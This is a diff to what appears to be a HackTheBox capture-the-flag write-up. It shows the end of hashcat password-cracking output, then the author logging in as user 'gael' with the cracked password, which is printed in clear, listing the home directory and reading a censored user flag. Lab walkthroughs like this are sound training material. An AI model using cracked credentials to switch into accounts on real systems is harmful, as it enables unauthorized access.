@@ -453,3 +453,28 @@ Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
 Candidate.Engine.: Device Generator
 Candidates.#2....: matuat -> mattj32
 ```
+
+Once I log in as `gael`, I can easily find the user flag in the home directory
+```
+$ su gael
+Password: mattp005numbertwo
+whoami
+gael
+cd /home/gael
+ls -la
+total 36
+drwxr-x--- 5 gael gael 4096 Aug 15 14:00 .
+drwxr-xr-x 4 root root 4096 Jun 18 13:19 ..
+lrwxrwxrwx 1 root root    9 Oct 19  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 gael gael  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 gael gael 3771 Feb 25  2020 .bashrc
+drwx------ 2 gael gael 4096 Sep  7  2024 .cache
+drwxr-xr-x 3 gael gael 4096 Aug 15 13:54 .local
+-rw-r--r-- 1 gael gael  807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root root    9 Oct 19  2024 .python_history -> /dev/null
+lrwxrwxrwx 1 root root    9 Oct 19  2024 .sqlite_history -> /dev/null
+drwx------ 2 gael gael 4096 Sep  7  2024 .ssh
+-rw-r----- 1 root gael   33 Aug 15 02:12 user.txt
+cat user.txt
+[censored-htb-flag]
+```
